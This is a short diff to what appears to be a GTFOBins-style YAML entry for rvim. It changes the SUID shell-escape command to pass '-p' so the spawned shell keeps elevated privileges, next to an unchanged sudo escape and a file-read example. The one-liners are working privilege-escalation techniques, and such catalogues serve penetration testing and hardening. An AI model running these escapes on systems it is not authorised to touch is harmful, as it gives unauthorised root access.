@@ -14,7 +14,7 @@ functions:
     - code: rvim file_to_read
   suid:
     - description: This requires that `rvim` is compiled with Python support.
-      code: ./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+      code: ./rvim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
   sudo:
     - description: This requires that `rvim` is compiled with Python support.
       code: sudo rvim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
